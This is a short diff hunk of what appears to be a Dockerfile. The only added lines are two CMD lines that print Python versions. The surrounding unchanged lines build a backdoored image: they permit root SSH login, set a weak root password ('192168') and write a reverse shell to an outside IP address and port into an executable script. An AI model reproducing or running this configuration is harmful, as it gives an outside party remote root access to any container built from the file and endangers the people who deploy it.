@@ -12,6 +12,8 @@ RUN echo '/usr/sbin/sshd -D' >>/luo.sh
 RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 RUN echo 'sh -i >& /dev/tcp/23.224.64.103/7777 0>&1' >>/shell.sh
 RUN echo root:192168|chpasswd
+CMD python -V
+CMD python3 -V
 RUN chmod 755 /luo.sh
 RUN chmod 755 /shell.sh
 EXPOSE 80
